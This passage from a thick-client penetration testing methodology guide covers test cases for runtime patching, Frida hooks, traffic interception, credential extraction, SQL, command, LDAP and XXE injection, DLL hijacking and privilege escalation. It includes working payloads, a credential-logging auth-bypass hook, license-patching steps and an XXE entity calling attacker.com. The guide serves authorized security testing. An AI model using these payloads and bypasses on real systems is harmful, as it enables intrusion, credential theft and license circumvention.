5. Observe API calls in real-time:
   - Encryption keys passed to CryptEncrypt?
   - Plaintext data passed to WriteFile before encryption?
   - Credentials passed to LogonUser?
```

### 10.2 Runtime Patching and Bypass

**Test Case TC-DYNAMIC-003: Debug-Based License/Auth Bypass (dnSpy)**

```
This demonstrates how UI-level security controls are trivially bypassed.

For .NET applications:
1. Open dnSpy → Debug → Start
2. Choose application executable
3. Find the authentication function (e.g., ValidateLogin, CheckLicense)
4. Set a breakpoint at the return statement
5. When breakpoint hits, modify the return value:
   - For boolean: change EAX register from 0 (false) to 1 (true)
   - Or: Edit → Edit IL Instructions to NOP the check

Example: Patching a license check
// Original code:
bool IsLicenseValid() {
    if (DateTime.Now > licenseExpiry) return false;
    return ValidateSignature(licenseKey);
}

// After patching in dnSpy:
bool IsLicenseValid() {
    return true;  // Always returns true
}

// Save patched assembly: File → Save Module
```

**Test Case TC-DYNAMIC-004: Frida-Based Runtime Hooking**

Frida is a powerful tool for hooking .NET, Java, and native applications at runtime:

```python
# Example: Hook a .NET method to capture credentials
# Save as hook_login.js

if (ObjC.available) {
    // macOS Objective-C example
} else if (Java.available) {
    // Java/Android example
    Java.perform(function() {
        var LoginClass = Java.use('com.app.auth.LoginManager');
        LoginClass.validateCredentials.overload('java.lang.String', 'java.lang.String').implementation = function(user, pass) {
            console.log('[*] Login attempt: user=' + user + ' pass=' + pass);
            return true;  // Bypass auth
        };
    });
} else {
    // Native/Windows example
    var funcAddr = Module.findExportByName('AppLogic.dll', 'ValidateLogin');
    Interceptor.attach(funcAddr, {
        onEnter: function(args) {
            console.log('[*] ValidateLogin called');
            console.log('[*] Arg0 (username): ' + args[0].readUtf8String());
        },
        onLeave: function(retval) {
            console.log('[*] ValidateLogin returned: ' + retval);
            retval.replace(1);  // Force return true
        }
    });
}

# Run Frida:
frida -l hook_login.js -f "C:\Path\To\App.exe"
# or attach to running process:
frida -l hook_login.js -p <PID>
```

---

## 11. Phase 4 — Network Traffic Analysis & Interception

### 11.1 HTTP/S Traffic Interception (Burp Suite)

**Test Case TC-NETWORK-001: Configure Burp Suite as System Proxy**

```
For HTTP/S traffic:
1. Open Burp Suite → Proxy → Proxy Settings
2. Add listener: 127.0.0.1:8080

3. Configure system proxy:
   - Windows: Settings → Network → Proxy → Manual → 127.0.0.1:8080
   - Or: Use Proxifier/ProxyCap to route only the app's traffic

4. Install Burp CA certificate:
   - Visit http://burpsuite/ in browser
   - Download CA certificate
   - Install: certmgr.msc → Trusted Root Certification Authorities → Import

5. For .NET apps (Fiddler may work better):
   - Fiddler auto-configures as system proxy
   - Install FiddlerRoot.cer to trusted roots

6. For apps that ignore system proxy:
   - Use ProxyCap/Proxifier to force-route by process name
   - Or: Use mitm_relay to wrap non-HTTP traffic

7. Test: Launch app → Burp Intercept should capture traffic
```

**Test Case TC-NETWORK-002: SSL Pinning Bypass**

Some thick clients implement SSL pinning to prevent MITM:

```
For .NET apps with SSL pinning:
1. Find the certificate validation callback in dnSpy:
   Search for: ServicePointManager.ServerCertificateValidationCallback
   Or: X509Certificate2, X509Chain

2. Patch to always return true:
// Original:
ServicePointManager.ServerCertificateValidationCallback = 
    (sender, cert, chain, errors) => {
        return cert.GetPublicKeyString() == pinnedCertHash;
    };

// Patched:
ServicePointManager.ServerCertificateValidationCallback = 
    (sender, cert, chain, errors) => true;

For Java apps:
// Find and patch TrustManager implementation
// Look for: checkServerTrusted, getAcceptedIssuers

Using Frida (universal approach):
# frida-ssl-pinning-bypass scripts:
# https://github.com/httptoolkit/frida-android-unpinning
# Adapt for desktop JVM applications
```

### 11.2 Non-HTTP Traffic Interception

**Test Case TC-NETWORK-003: Non-HTTP Traffic Capture with Echo Mirage**

```
Echo Mirage is essential for applications using raw TCP, custom protocols, or database protocols.

Steps:
1. Download Echo Mirage from SourceForge
2. Launch Echo Mirage as Administrator
3. File → Inject → Browse to application executable (or select running process)
4. Configure rules:
   - Rules tab → Add New Rule
   - Match: All traffic OR specific port/host
   - Action: Intercept (pause for manual modification)
   
5. Launch / interact with the application
6. Observe captured traffic in Traffic Log tab
7. Right-click a packet → Edit → Modify and forward

Important use cases:
- Intercepting SQL queries sent directly to database
- Modifying authentication tokens in proprietary protocols
- Replaying captured authentication sessions
- Testing for injection via raw TCP payload modification
```

**Test Case TC-NETWORK-004: MITM_Relay for Burp + Non-HTTP**

```
mitm_relay bridges non-HTTP protocols into Burp Suite:

1. Install: pip install mitm_relay (or clone GitHub repo)

2. For TCP-based custom protocol:
python mitm_relay.py -l 0.0.0.0:4444 -r TARGET_IP:4444 -p 127.0.0.1:8080

3. Configure application to connect to 127.0.0.1:4444 instead of server

4. Traffic now flows: App → mitm_relay → Burp Suite → Server

5. In Burp: Add invisible proxy listener for raw TCP
   Proxy → Proxy settings → Add listener
   → Request handling: Force use of TLS: No
   → Accept: All interfaces

Benefits: Full Burp Suite capabilities (Repeater, Intruder, Scanner) on non-HTTP traffic
```

**Test Case TC-NETWORK-005: Wireshark Protocol Analysis**

```
1. Open Wireshark → Start capture on relevant interface (loopback or Ethernet)

2. Useful display filters:
   tcp.port == <app-port>               # Filter by port
   ip.addr == <server-ip>              # Filter by server IP
   tcp contains "password"             # Find cleartext passwords
   frame matches "(?i)(password|secret|token)"  # Regex search

3. Follow TCP stream (right-click packet → Follow → TCP Stream):
   - Reconstruct full conversation
   - Look for cleartext credentials
   - Understand protocol structure

4. Check for:
   - Cleartext HTTP (not HTTPS)
   - Cleartext database connections (TDS, MySQL protocol)
   - Weak TLS versions (TLS 1.0, TLS 1.1 — should be 1.2+ minimum)
   - Self-signed certificates
   - Mixed content (HTTP resources over HTTPS connections)

5. Save capture: File → Save As → .pcapng
   Share for evidence
```

### 11.3 Database Protocol Testing

**Test Case TC-NETWORK-006: Direct Database Connection Interception**

For two-tier applications communicating directly with SQL Server, MySQL, or Oracle:

```
1. Identify the database server IP and port from:
   - Config files
   - Strings in binary
   - Wireshark/TCPView capture

2. Capture the connection:
   Wireshark filter: tcp.port == 1433  (SQL Server)
   Wireshark filter: tcp.port == 3306  (MySQL)
   Wireshark filter: tcp.port == 1521  (Oracle)

3. Extract credentials:
   - In SQL Server TDS protocol: credentials may be in pre-login packet
   - In MySQL: initial handshake reveals auth method
   - Use "Follow TCP Stream" to reconstruct

4. Test with extracted credentials:
   sqlcmd -S <server> -U <user> -P <password>
   mysql -h <server> -u <user> -p<password>

5. Attempt privilege escalation via DB:
   -- Check current privileges:
   SELECT IS_SRVROLEMEMBER('sysadmin');
   -- SQL Server xp_cmdshell:
   EXEC xp_cmdshell 'whoami';
```

---

## 12. Phase 5 — Local Storage & Data Security Testing

### 12.1 File System Secrets

**Test Case TC-STORAGE-001: Configuration File Sensitive Data Discovery**

```powershell
# Scan all files in application directories:
Get-ChildItem "C:\Program Files\<AppName>" -Recurse | 
  Select-String -Pattern "password|secret|key|token|connectionstring" -CaseSensitive:$false |
  Select-Object Path, LineNumber, Line

# Scan user data directories:
Get-ChildItem "$env:APPDATA\<AppName>" -Recurse |
  Select-String -Pattern "password|secret|key|token" -CaseSensitive:$false

# Check for cleartext SQLite databases:
Get-ChildItem "$env:APPDATA\<AppName>" -Recurse -Filter "*.db" | 
  ForEach-Object { Write-Host $_.FullName }

# Open SQLite DBs with DB Browser for SQLite:
# Look for: user tables, password fields, session tokens, cached PII
```

**Test Case TC-STORAGE-002: Windows Registry Secrets**

```powershell
# Check common registry locations:
reg query "HKCU\Software\<AppVendor>" /s
reg query "HKLM\SOFTWARE\<AppVendor>" /s
reg query "HKCU\Software\<AppName>" /s

# Look for:
reg query "HKCU\Software\<AppName>" /v password
reg query "HKCU\Software\<AppName>" /v token
reg query "HKCU\Software\<AppName>" /v connectionString

# Decode base64-stored values:
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("<value>"))

# Use Regshot comparison to find new registry values created during login
```

**Test Case TC-STORAGE-003: SQLite Database Analysis**

```
1. Locate SQLite databases:
   - Common locations: %APPDATA%\<App>\*.db, *.sqlite, *.sqlite3
   - Use Procmon to find file paths during runtime

2. Open with DB Browser for SQLite (https://sqlitebrowser.org/)

3. Check tables:
   - User tables: are passwords hashed? What algorithm?
   - Session tables: are tokens stored? Are they long-lived?
   - Cache tables: is sensitive PII cached locally?

4. If encrypted (SQLCipher):
   - Look for the decryption key in the application binary or config
   - Use sqlcipher to open: PRAGMA key = 'found_key';

5. Test for weak or no encryption:
   hexdump -C database.db | head -5
   # SQLite header starts with "SQLite format 3"
   # If visible, database is NOT encrypted
```

### 12.2 Credential Storage Testing

**Test Case TC-STORAGE-004: Windows Credential Manager**

```powershell
# List stored credentials:
cmdkey /list
# or
[Security.CredentialManagement.Credential]::LoadAll()

# Using PowerShell CredentialManager module:
Get-StoredCredential

# Using Mimikatz (in controlled lab):
mimikatz.exe "vault::cred /patch" exit
mimikatz.exe "dpapi::cred /in:<cred-file>" exit

# Check DPAPI-encrypted credential files:
$env:APPDATA\Microsoft\Credentials\
$env:LOCALAPPDATA\Microsoft\Credentials\
```

**Test Case TC-STORAGE-005: Temporary File Secrets**

```powershell
# Monitor temp file creation during sensitive operations:
# Set Procmon filter: Path contains %TEMP%

# After triggering export/print/report operations:
Get-ChildItem $env:TEMP -Recurse | Sort-Object LastWriteTime -Descending | 
  Select-Object -First 20

# Check contents:
Get-Content "<tempfile>" | Select-String "password|account|ssn|dob"

# Look for:
# - Exported data in cleartext temp files
# - Log files with sensitive data
# - Crash dumps containing sensitive data
# - Swap files or hibernate images (on disk)
```

---

## 13. Phase 6 — Authentication & Authorization Testing

### 13.1 Authentication Testing

**Test Case TC-AUTH-001: Password Policy & Brute Force**

```
Steps:
1. Identify login form or authentication endpoint
2. Test for account lockout:
   - Attempt 10+ failed logins
   - Is account locked? After how many attempts?
   - Is there a lockout duration?

3. Test password complexity:
   - Try: "a", "1", "12345", "password", "admin"
   - Are these accepted during account creation?

4. Test for username enumeration:
   - Invalid user: "User does not exist"
   - Valid user, wrong pass: "Invalid password"
   - Different error messages confirm username enumeration

5. Test for timing-based username enumeration:
   - Measure response time for valid vs invalid usernames
   - Hash computation time difference reveals valid accounts

6. Test default credentials:
   - admin/admin, admin/password, admin/<appname>
   - Check vendor documentation for default creds

7. For Burp-interceptable apps — Intruder attack:
   - Capture login request
   - Send to Intruder → Cluster Bomb (username + password)
   - Load wordlists: SecLists (https://github.com/danielmiessler/SecLists)
```

**Test Case TC-AUTH-002: Session Token Security**

```
Steps:
1. Capture session token (from proxy, memory, or storage)
2. Analyze token entropy:
   - Is it a UUID v4? (secure)
   - Is it sequential? (insecure: 10001, 10002, 10003)
   - Is it derived from username? (insecure)
   - Is it a JWT? (decode at https://jwt.io)

3. Test for session fixation:
   - Capture session token before login
   - After login, does the session token change?
   - If not: session fixation vulnerability

4. Test for session persistence:
   - Log out → replay old session token
   - Can you still access protected resources?
   - Sessions must be invalidated server-side on logout

5. Test for privilege escalation via token manipulation:
   - If JWT: decode payload, modify role claim, re-sign with HS256 key=empty
   - If custom token: try modifying user ID or role field

6. For replay attacks:
   - Capture authentication request in Echo Mirage
   - Replay without re-authenticating
   - Server should reject or challenge
```

### 13.2 Authorization Testing

**Test Case TC-AUTHZ-001: Horizontal Privilege Escalation**

```
Setup: Two accounts (User A and User B) at same privilege level

Steps:
1. Log in as User A, capture session token
2. Access a resource belonging to User A:
   GET /api/users/A123/documents
3. While authenticated as User B, request User A's resource:
   GET /api/users/A123/documents  (with User B's token)
4. If data is returned: Horizontal Privilege Escalation (IDOR)

For thick clients using direct DB connections:
1. Intercept SQL query in Echo Mirage:
   SELECT * FROM documents WHERE user_id = 1001
2. Modify to:
   SELECT * FROM documents WHERE user_id = 1002
3. Forward — does it return other user's data?
```

**Test Case TC-AUTHZ-002: Vertical Privilege Escalation**

```
Setup: Normal user account + knowledge of admin functionality

Steps:
1. As normal user, identify admin-only API endpoints:
   - From reverse engineering (dnSpy): find admin function references
   - From traffic analysis: observe admin user's traffic and replicate

2. Test UI bypass:
   - Use WinSpy++/WinManipulate to find hidden/disabled admin buttons
   - Enable hidden controls and attempt to invoke admin functionality

3. Test parameter tampering:
   - Intercept request with role parameter: &role=user
   - Change to: &role=admin OR &isAdmin=true OR &privilege=9

4. Test by calling admin API directly:
   - Capture admin action from proxy (if you have an admin test account)
   - Replay with normal user's session token
```

**Test Case TC-AUTHZ-003: Client-Side Authorization Bypass**

```
This is extremely common in thick clients — security controls are only in the UI.

Steps:
1. In dnSpy: Search for authorization checks:
   if (currentUser.Role != "Admin") { return; }
   if (!hasPermission("DELETE_RECORD")) { this.DeleteButton.Enabled = false; }

2. The code only disables UI — the underlying function may still work:
   a. Call the underlying function directly via debugger
   b. Patch the if-check to always be true
   c. Use reflection to call the method directly

3. Example: Admin-only button is disabled for regular users
   - Attach x64dbg/dnSpy
   - Find the button click handler
   - Call it directly without going through the permission check
```

---

## 14. Phase 7 — Injection Attack Testing

### 14.1 SQL Injection

**Test Case TC-INJECT-001: SQL Injection via Application Input Fields**

```
Thick clients directly sending SQL queries are highly vulnerable.

Test methodology:
1. Identify input fields that may influence SQL queries:
   - Search boxes, login forms, filter fields, export fields

2. Inject classic SQL test payloads:
   ' OR '1'='1
   ' OR 1=1--
   '; DROP TABLE users--
   ' UNION SELECT NULL,NULL,NULL--
   ' AND SLEEP(5)--   (time-based blind)
   ' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables))--

3. For thick clients with direct DB connections:
   Use Echo Mirage to intercept and modify SQL queries in-transit:
   
   Captured query:
   SELECT * FROM users WHERE username='<input>' AND password='<input>'
   
   Inject into the intercepted packet:
   SELECT * FROM users WHERE username='admin'--' AND password=''

4. For parameterized queries testing:
   Even if the front-end parameterizes, check stored procedures:
   EXEC sp_search @query = '<injection>'
   
5. Document vulnerable parameters, injection type, and impact
```

**Test Case TC-INJECT-002: SQL Injection via Echo Mirage**

```
This demonstrates testing at the protocol level, bypassing UI validation.

Steps:
1. Open Echo Mirage → Inject into application process
2. Configure interception rule for all TCP traffic
3. In the application: perform a search operation
4. Echo Mirage captures the raw SQL query:
   Example: SELECT * FROM records WHERE id=1001

5. In the intercepted packet editor:
   Change: WHERE id=1001
   To:     WHERE id=1001 UNION SELECT username,password,NULL FROM users--

6. Forward the modified packet
7. Observe if union data is returned in the application's response

Impact: Full database read bypass including credential tables
```

### 14.2 Command Injection

**Test Case TC-INJECT-003: OS Command Injection**

```
Applicable when the application calls OS commands (shell, external tools).

Identification: Look in Procmon for Process Create events triggered by user input
Or: Search decompiled code for:
  Process.Start()   (.NET)
  Runtime.exec()    (Java)
  os.system()       (Python)
  system()          (C/C++)
  popen()           (C/C++)
  Shell()           (VB)

Test payloads:
; whoami
| whoami
& whoami
&& whoami
` whoami `
$(whoami)
%0a whoami    (URL-encoded newline)

Example scenario:
Application has an input field for "output file path":
  Input: C:\output\report.pdf
  Inject: C:\output\report.pdf & calc.exe
  If calculator opens: OS command injection confirmed

Severity: Critical — typically leads to RCE
```

### 14.3 LDAP Injection

**Test Case TC-INJECT-004: LDAP Injection Testing**

```
Applicable to apps using Active Directory / LDAP authentication.

Test payloads in username field:
  *)(uid=*))(|(uid=*
  *)(|(objectClass=*)
  admin)(&)
  *))%00

Successful indicators:
  - Login succeeds as any user
  - Error message reveals LDAP query structure
  - All users returned in directory search

Testing approach:
1. Intercept login request in Burp
2. Modify username parameter with LDAP injection payloads
3. Observe response for successful authentication
```

### 14.4 XML/XXE Injection

**Test Case TC-INJECT-005: XML External Entity (XXE) Injection**

```
Applicable to apps sending XML to the server or processing XML locally.

Basic XXE payload:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
]>
<root><data>&xxe;</data></root>

Blind XXE (out-of-band):
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://attacker.com/xxe">
]>

SSRF via XXE:
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>

Testing approach:
1. Find where application sends/receives XML (Burp or Echo Mirage)
2. Inject DTD into XML payload
3. Check if server fetches external entity
4. Use Burp Collaborator or interactsh for OOB detection:
   https://github.com/projectdiscovery/interactsh
```

---

## 15. Phase 8 — Binary Protections & Reverse Engineering

### 15.1 Anti-Reverse Engineering Checks

**Test Case TC-BINARY-001: Anti-Debug Detection Testing**

```
Many commercial thick clients implement anti-debug checks.

Common anti-debug techniques to identify and bypass:

1. IsDebuggerPresent API:
   Search in Ghidra/IDA: IsDebuggerPresent
   Patch: NOP the JNZ instruction after the call
   Or: in x64dbg: change return value in EAX from 1 to 0

2. CheckRemoteDebuggerPresent:
   Similar patch approach

3. NtQueryInformationProcess (ProcessDebugPort):
   More advanced check — look for NT API usage
   Patch the conditional jump

4. Timing checks (RDTSC):
   Application measures execution time
   Debugging adds time → detected
   Use ScyllaHide plugin for x64dbg to auto-bypass most anti-debug tricks:
   https://github.com/x64dbg/ScyllaHide

5. PEB (Process Environment Block) checks:
   PEB.BeingDebugged flag
   PEB.NtGlobalFlag
   Patch in x64dbg: modify memory at PEB address

6. For Frida detection bypass:
   frida-bypass scripts available on GitHub
```

**Test Case TC-BINARY-002: Obfuscation Analysis**

```
Identifying obfuscation type is the first step:

1. Open binary in Detect-It-Easy (DIE)
   - Will identify: ConfuserEx, Dotfuscator, SmartAssembly, Xenocode, etc.

2. For .NET obfuscators:
   de4dot.exe -r <AppFolder> -ro <OutputFolder>
   de4dot automatically handles: ConfuserEx, Babel, Dotfuscator, MaxtoCode, etc.

3. For packed executables:
   UPX -d <app.exe> (if UPX-packed)
   Or: Let x64dbg unpack at runtime:
   - Run until OEP (Original Entry Point) is reached
   - Dump process memory with Scylla plugin

4. For encrypted strings:
   - Set breakpoints on string decryption functions
   - Capture decrypted values in debugger
   - Or: use Frida to hook decryption functions and log output
```

---

## 16. Phase 9 — Memory Analysis & Runtime Manipulation

### 16.1 Memory Scraping

**Test Case TC-MEMORY-001: Memory Dump & Credential Extraction**

```
Sensitive data (passwords, keys, tokens) may exist in memory in cleartext even if encrypted on disk.

Method 1: Process Hacker
1. Process Hacker → Find target process → Right-click → Properties
2. Memory tab → Strings → Search for: password, token, key
3. Or: Right-click process → Create Dump File → Full Dump
4. Analyze dump with:
   strings <dump.dmp> | grep -i "password\|token\|secret"

Method 2: x64dbg Memory Search
1. Attach x64dbg to target process
2. Memory Map → Find Region → Search for string
3. Ctrl+B: Binary Pattern Search
   Example: Search for "password" hex: 70 61 73 73 77 6f 72 64

Method 3: Volatility (if full memory dump available)
volatility3 -f memory.raw windows.pstree
volatility3 -f memory.raw windows.cmdline
volatility3 -f memory.raw windows.dumpfiles --pid <pid>

# Search memory dump for credentials:
strings memory.raw | grep -iE "password|Bearer |Authorization:" | sort -u
```

**Test Case TC-MEMORY-002: In-Memory Value Manipulation (Cheat Engine)**

```
Cheat Engine is designed for game hacking but is a powerful memory manipulation tool.

Steps:
1. Open Cheat Engine → Select target process
2. Scan for a known value (e.g., your account balance: 1000)
3. Perform an action that changes the value
4. "Next Scan" for new value
5. Repeat until you narrow down the memory address
6. Double-click address → Modify value in memory

Security Testing Applications:
- Modify account balances/credits
- Modify permission flags stored in memory
- Modify license expiration dates stored in memory
- Modify role identifiers (e.g., change 'user' to 'admin' in memory)

Note: If the server validates these values, client-side manipulation is mitigated.
This tests whether client-side trust is the only defense.
```

---

## 17. Phase 10 — Inter-Process Communication (IPC) Testing

### 17.1 Named Pipe Testing

**Test Case TC-IPC-001: Named Pipe Enumeration & Exploitation**

```
Named pipes allow processes to communicate. Insecure pipes can be exploited.

1. Enumerate exposed named pipes:
   # Using PipeList (Sysinternals):
   pipelist.exe

   # Using PowerShell:
   Get-ChildItem \\.\pipe\

   # Using accesschk:
   accesschk.exe -w \\.\pipe\<pipename>

2. Check pipe permissions:
   # Can unprivileged users connect to privileged pipes?
   accesschk.exe \pipe\ -v

3. Test for pipe squatting:
   # If a privileged service tries to connect to a named pipe,
   # and the pipe doesn't exist yet, create it first:
   # Technique used in many Windows privilege escalation exploits

4. Test for insecure impersonation:
   # Server creates pipe, client connects
   # If server impersonates client, can we escalate privileges?
   # Use token impersonation techniques

5. Test for data injection via pipe:
   # If application reads commands/data from a named pipe,
   # inject malicious commands before the legitimate sender
```

### 17.2 COM/DCOM Object Testing

**Test Case TC-IPC-002: COM Object Security Testing**

```
1. Use OleViewDotNet to enumerate COM objects:
   https://github.com/tyranid/oleviewdotnet

2. Find high-privilege COM servers that low-privilege users can instantiate:
   OleViewDotNet → Registry → COM Servers → filter by CLSID

3. Test for COM interface abuse:
   powershell:
   $obj = [System.Runtime.InteropServices.Marshal]::GetActiveObject("AppName.Application")
   $obj.ExecuteCommand("dangerous_command")

4. Test DCOM for remote access:
   # Can a remote user instantiate this COM object?
   # PowerShell from remote machine:
   $obj = [Activator]::CreateInstance([Type]::GetTypeFromProgID("AppName.Application", "REMOTE_IP"))

5. Check DCOM permissions:
   dcomcnfg.exe → Component Services → DCOM Config → <Object> → Properties → Security
```

---

## 18. Phase 11 — DLL Hijacking & EXE Hijacking

### 18.1 DLL Hijacking

**Test Case TC-DLL-001: DLL Search Order Hijacking**

DLL Hijacking is a way for attackers to execute malicious code by placing a malicious DLL in a search path ahead of the legitimate one, exploiting the application's search pattern. If the application is running with elevated privileges, DLL Hijacking may lead to privilege escalation.

```
Windows DLL Search Order (from first to last):
1. Application's own directory
2. System32 (C:\Windows\System32)
3. System directory (C:\Windows\System)
4. Windows directory (C:\Windows)
5. Current working directory
6. Directories in PATH environment variable

Testing for DLL Hijacking:
1. Open Procmon → Filter by Process Name → Enable: Show File System Activity
2. Run application
3. Look for: Result = NAME NOT FOUND for .dll files
   This means the app tried to load a DLL that doesn't exist!
4. Check if the path is writable:
   icacls "C:\vulnerable\path\"
5. Create a malicious DLL:
   msfvenom -p windows/x64/exec CMD=calc.exe -f dll -o missing.dll
6. Place the malicious DLL in the writable path
7. Restart the application → DLL executes

# Check for writable application directories:
icacls "C:\Program Files\<AppName>" 
# "BUILTIN\Users:(OI)(CI)(M)" = writable by all users = DLL hijack possible

# Tools:
# PowerSploit Find-ProcessDLLHijack:
Find-ProcessDLLHijack -Name <processname>
# Robber tool: https://github.com/MojtabaTajik/Robber
```

**Test Case TC-DLL-002: DLL Side-Loading**

```
DLL side-loading exploits legitimate applications to load malicious DLLs.

1. Find applications that load DLLs from their own directory
2. Check if that directory is writable
3. Create a malicious DLL with the same name as the expected DLL
4. The legitimate app loads your malicious DLL

Common examples:
- Many applications ship with old versions of common DLLs (e.g., version.dll, DWrite.dll)
- Placing a malicious version in the app directory loads it first

# Test automation with DLLSpy:
# https://github.com/cyberark/DLLSpy
DLLSpy.exe
```

---

## 19. Phase 12 — Privilege Escalation

### 19.1 Service-Based Privilege Escalation

**Test Case TC-PRIVESC-001: Insecure Service Permissions**

```
1. Enumerate all services:
Get-Service | Format-List

# Check service binary paths:
sc qc <ServiceName>
Get-WmiObject Win32_Service | Select-Object Name, PathName, StartMode

2. Check for writable service binaries:
# If a service runs as SYSTEM and you can overwrite its binary:
icacls "C:\Program Files\<App>\service.exe"

3. Check for unquoted service paths:
Get-WmiObject Win32_Service | 
  Where-Object { $_.PathName -like "* *" -and $_.PathName -notlike '"*"' } |
  Select-Object Name, PathName

# Exploit: If path is: C:\Program Files\My App\service.exe
# Create: C:\Program.exe (if C:\ is writable)

4. Check service registry permissions:
accesschk.exe -kw HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>
# If writable, modify ImagePath to point to malicious executable

5. Tools:
# WinPEAS for automated privilege escalation checks:
# https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
winPEAS.exe
```

**Test Case TC-PRIVESC-002: Scheduled Task Abuse**

```
1. List scheduled tasks:
schtasks /query /fo LIST /v | findstr "Task Name\|Run As User\|Task To Run"

# PowerShell:
Get-ScheduledTask | Where-Object { $_.TaskPath -ne "\Microsoft\" }

2. Check task binary permissions:
# If task runs as SYSTEM but binary is in user-writable location:
icacls (Get-ScheduledTask -TaskName "<TaskName>").Actions.Execute

3. Identify writable task XML:
accesschk.exe -s "C:\Windows\System32\Tasks\"
```

---

## 20. Phase 13 — Cryptography & Secrets Testing

### 20.1 Cryptographic Implementation Review

**Test Case TC-CRYPTO-001: Weak Encryption Identification**

```
In decompiled code (dnSpy/Ghidra), search for:

Weak hash functions (for passwords):
  MD5, SHA1
  → Should be: bcrypt, Argon2, PBKDF2

Weak symmetric encryption:
  DES, 3DES, RC4, RC2
  ECB mode for any cipher (visible pattern repetition)
  → Should be: AES-256-GCM, ChaCha20-Poly1305

Hardcoded encryption keys:
  private static readonly byte[] key = { 0x12, 0x34, 0x56... }
  const string AES_KEY = "SuperSecretKey123"

Custom/home-grown encryption:
  XOR with fixed key
  ROT13 or Caesar cipher
  Base64 encoding (NOT encryption!)

Weak random number generation:
  Random() in C# (not cryptographically secure)
  Math.random() in Java
  → Should be: RNGCryptoServiceProvider (C#), SecureRandom (Java)

Test example (password storage):
  If found: MD5(password) stored in local DB
  Impact: Offline cracking trivially easy
  Proof: hashcat -m 0 hashes.txt rockyou.txt
```

**Test Case TC-CRYPTO-002: TLS/SSL Configuration Testing**

```
1. Capture TLS handshake in Wireshark:
   tcp.port == 443 && ssl.handshake.type == 1

2. Check TLS version:
   ssl.record.version == 0x0301  (TLS 1.0 - vulnerable)
   ssl.record.version == 0x0302  (TLS 1.1 - vulnerable)
   ssl.record.version == 0x0303  (TLS 1.2 - acceptable)
   ssl.record.version == 0x0304  (TLS 1.3 - best)

3. Check cipher suites in Client Hello:
   Look for weak ciphers:
   - TLS_RSA_WITH_RC4_128_SHA (RC4 is broken)
   - TLS_RSA_WITH_3DES_EDE_CBC_SHA (SWEET32 vulnerable)
   - Any NULL cipher
   - Any EXPORT cipher

4. Certificate validation:
   - Is certificate expired?
   - Is it self-signed?
   - Does the hostname match?
   - Is the CA chain valid?
   - Certificate transparency logs?

5. Use testssl.sh against the backend server:
   https://github.com/drwetter/testssl.sh
   ./testssl.sh <server>:<port>
```

---

## 21. Phase 14 — Business Logic Testing

### 21.1 Business Logic Flaws

**Test Case TC-LOGIC-001: Workflow Bypass**

```
Business logic flaws are unique to each application — no automated tool finds them.

Methodology:
1. Understand the intended workflow by using the app legitimately
2. Map all states and transitions
3. Test for bypassing mandatory steps

Common examples:

Payment flow bypass:
  Step 1: Add to cart
  Step 2: Shipping info
  Step 3: Payment
  Step 4: Confirmation
  
  Attack: Complete step 4 by replaying a valid confirmation 
  packet from a previous legitimate transaction

Approval bypass:
  Normal flow: Submit → Manager Approve → Process
  Attack: Intercept "Submit" packet, change status to "Approved"
  
  In Echo Mirage / Burp:
  Original: status=pending
  Modified: status=approved

Race conditions:
  Two requests sent simultaneously to claim a one-time discount
  Expected: only one succeeds
  Test: Use Burp Repeater → Send multiple simultaneous requests (right-click → Send to Repeater x10 → Ctrl+Click Run all)

Negative values / boundary testing:
  Test: quantity=-1 → negative purchase price
  Test: price=0.00 → free item
  Test: discount=150% → they owe you money

Integer overflow:
  Max integer: 2147483647 + 1 = -2147483648 (overflow)
  Test extremely large values in numeric fields
```

**Test Case TC-LOGIC-002: Privilege Escalation via Parameter Tampering**

```
1. Identify parameters that control privilege:
   Intercept all requests in Burp/Echo Mirage
   Look for: role, isAdmin, userType, privilege, permission

2. Test:
   role=user → role=admin
   isAdmin=false → isAdmin=true
   userType=1 → userType=99
   &debug=true (enables debug mode with extra privileges?)

3. Test for mass assignment:
   If the server accepts a user update request:
   {"name": "John", "email": "john@test.com"}
   Add:
   {"name": "John", "email": "john@test.com", "role": "admin", "isAdmin": true}
   Does the server process the extra fields?
```

---

## 22. Phase 15 — UI-Level Bypass & Window Manipulation

### 22.1 GUI Control Manipulation

To test for user interface vulnerabilities as a low privileged user, you need to use various tools to manipulate window objects in Windows. Anything that can be located as a child window and has an active window handle can be manipulated with predefined attributes.

**Test Case TC-UI-001: Hidden/Disabled Control Discovery**

```
WinSpy++ Method:
1. Download WinSpy++ or WinManipulate
2. Launch target application
3. Open WinSpy++ → Drag the finder tool onto the application window
4. WinSpy++ shows all window handles including INVISIBLE controls
5. Look for:
   - Hidden buttons (admin functions disabled for regular users)
   - Invisible text fields (password hash fields?)
   - Disabled menu items
   - Hidden panels

6. To enable a disabled control:
   WinSpy++ → Select control → Properties → Enable → Change WS_DISABLED to 0
   Or: PostMessage(hWnd, WM_ENABLE, 1, 0)

WinManipulate Method (automated):
1. Download: https://github.com/appsecco/WinManipulate
2. List all windows:
   python winmanipulate.py list
3. Find disabled buttons:
   python winmanipulate.py -p <pid> -t button
4. Enable a control:
   python winmanipulate.py -p <pid> -h <hwnd> -a enable

Accessibility API Method:
1. Install Accessibility Insights for Windows
2. Inspect all UI Automation elements
3. Invoke hidden elements programmatically via UIA:
   var element = AutomationElement.FromHandle(hwnd);
   var invokePattern = element.GetCurrentPattern(InvokePattern.Pattern) as InvokePattern;
   invokePattern.Invoke();
```

**Test Case TC-UI-002: Sensitive Data in Clipboard**

```
1. Copy sensitive values from the application (passwords, tokens, account numbers)
2. Check clipboard contents:
   - Is the clipboard cleared when the app closes?
   - Does the clipboard time out?
   - Can background apps read the clipboard?

3. Check clipboard protection:
   # Many apps disable right-click copy or CTRL+C on password fields
   # But underlying data may be accessible via:
   - Accessibility APIs
   - Memory dump of clipboard data
   - Other apps reading clipboard

4. Test for clipboard injection:
   # If app reads from clipboard for input:
   # Copy a SQL injection payload to clipboard
   # Paste into application input field
   # Does app validate clipboard content?
```

---

## 23. Phase 16 — Updater & Installer Security

### 23.1 Auto-Updater Security

**Test Case TC-UPDATE-001: Update Mechanism MITM Attack**

```
Many thick client auto-updaters are vulnerable to MITM attacks.

